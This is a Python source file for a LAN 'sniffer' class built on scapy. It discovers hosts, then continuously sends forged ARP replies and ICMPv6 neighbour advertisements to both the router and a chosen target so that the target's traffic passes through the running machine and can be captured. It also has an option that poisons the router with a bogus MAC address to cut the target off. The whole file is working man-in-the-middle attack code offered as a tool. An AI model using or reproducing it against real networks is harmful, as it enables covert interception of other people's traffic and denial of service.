import threading
import time

from scapy.arch import get_if_addr, get_if_addr6, get_if_hwaddr
from scapy.base_classes import Net
from scapy.config import conf
from scapy.layers import l2, inet, inet6
from scapy.packet import Packet
from scapy.sendrecv import sendp, sniff, srp1
from scapy.utils6 import Net6


class Sniffer:
    def __init__(self, iff=conf.iface, spoof_interval=3):
        """
        LAN Network sniffer using ARP spoofing
        :param iff: LAN interface
        :param spoof_interval: interval of ARP message
        """
        self.started = False
        self.iff = iff
        self.local_ip = get_if_addr(iff)
        self.local_ip6 = get_if_addr6(iff)
        self.local_mac = get_if_hwaddr(iff)
        self.router_ip = conf.route.route('0.0.0.0')[2]
        self.router_ip6 = conf.route6.route('::')[2]
        self.router_mac = l2.getmacbyip(self.router_ip)
        self.target_ip = None
        self.target_ip6 = None
        self.target_mac = None
        print("Local IP   :", self.local_ip)
        print("Local IP6  :", self.local_ip6)
        print("Local MAC  :", self.local_mac)
        print("Router IP  :", self.router_ip)
        print("Router IP6 :", self.router_ip6)
        print("Router MAC :", self.router_mac)
        self.banned = False
        self.spoof_interval = spoof_interval

    def scan(self, net: str, timeout=0.1) -> dict:
        """
        Scan LAN, discover sniffable hosts
        :param net: network address in IP cidr
        :param timeout: timeout for ARP response
        """
        result = dict()
        for ip in Net(net):
            req = l2.Ether(dst='ff:ff:ff:ff:ff:ff') / l2.ARP(pdst=ip)
            res = srp1(req, timeout=timeout, verbose=False, iface=self.iff)
            if res is not None and \
                    res[l2.ARP].psrc not in [self.local_ip, self.router_ip] and \
                    res[l2.ARP].hwsrc not in [self.local_mac, self.router_mac]:
                result[res[l2.ARP].psrc] = res[l2.ARP].hwsrc
        return result

    def scan6(self, net6: str, timeout=0.1):
        """
        Scan LAN, discover sniffable hosts
        :param net6: network address in IPv6 cidr
        :param timeout: timeout for ICMPv6 response
        """
        result = dict()
        for ip6 in Net6(net6):
            req = l2.Ether(dst='ff:ff:ff:ff:ff:ff') / inet6.IPv6(dst=ip6) / inet6.ICMPv6ND_NS(tgt=ip6)
            res = srp1(req, timeout=timeout, verbose=False, iface=self.iff)
            if res is not None and \
                    res[inet6.IPv6].src not in [self.local_ip6, self.router_ip6] and \
                    res[l2.Ether].src not in [self.local_mac, self.router_mac]:
                result[res[inet6.IPv6].src] = res[l2.Ether].src
        return result

    def add(self, ip: str, ip6=None) -> bool:
        mac = l2.getmacbyip(ip)
        if mac is not None:
            self.target_ip = ip
            self.target_ip6 = ip6
            self.target_mac = mac
            return True
        return False

    def start(self, on_recv: callable, spoof=True):
        """
        Start sniffing
        :param on_recv: a callback function when receiving a packet
        """
        self.started = True
        print("Start sniffing")
        if spoof:
            threading.Thread(target=self._spoof_router, daemon=False).start()
            threading.Thread(target=self._spoof_targets, daemon=False).start()
        sniff(lfilter=self._filter, stop_filter=lambda p: not self.start, prn=on_recv, iface=self.iff)

    def _spoof_router(self):
        """
        ARP and ICMPv6 spoof router
        """
        while self.started:
            mac = 'aa:bb:cc:dd:ee:ff' if self.banned else self.local_mac
            # ARP spoofing
            if self.target_ip is not None:
                p = l2.Ether(dst=self.router_mac) / \
                    l2.ARP(op=2, psrc=self.target_ip, pdst=self.router_ip, hwsrc=mac)
                sendp(p, verbose=False, iface=self.iff)
            # ICMPv6 neighbour spoofing
            if self.target_ip6 is not None:
                p = l2.Ether(dst=self.router_mac) / \
                    inet6.IPv6(src=self.target_ip6, dst=self.router_ip6) / \
                    inet6.ICMPv6ND_NA(tgt=self.target_ip6, R=0) / \
                    inet6.ICMPv6NDOptDstLLAddr(lladdr=mac)
                sendp(p, verbose=False, iface=self.iff)
            time.sleep(self.spoof_interval)

    def _spoof_targets(self):
        """
        ARP and ICMPv6 spoof targets
        """
        while self.started:
            # ARP spoofing
            if self.target_ip is not None:
                p = l2.Ether(dst=self.target_mac) / \
                    l2.ARP(op=2, psrc=self.router_ip, pdst=self.target_ip, hwsrc=self.local_mac)
                sendp(p, verbose=False, iface=self.iff)
            # ICMPv6 neighbour spoofing
            if self.target_ip6 is not None:
                p = l2.Ether(dst=self.target_mac) / \
                    inet6.IPv6(src=self.router_ip6, dst=self.target_ip6) / \
                    inet6.ICMPv6ND_NA(tgt=self.router_ip6, R=0) / \
                    inet6.ICMPv6NDOptDstLLAddr(lladdr=self.local_mac)
                sendp(p, verbose=False, iface=self.iff)
                pass
            time.sleep(self.spoof_interval)

    def _filter(self, p: Packet):
        """
        Filter packets to make sure we only process our target's packet
        :param p: packet to be determined
        """
        if p.haslayer(inet.IP):
            return self.target_ip in [p[inet.IP].src, p[inet.IP].dst]
        elif p.haslayer(inet6.IPv6):
            return self.target_ip6 in [p[inet6.IPv6].src, p[inet6.IPv6].dst]
        else:
            return False
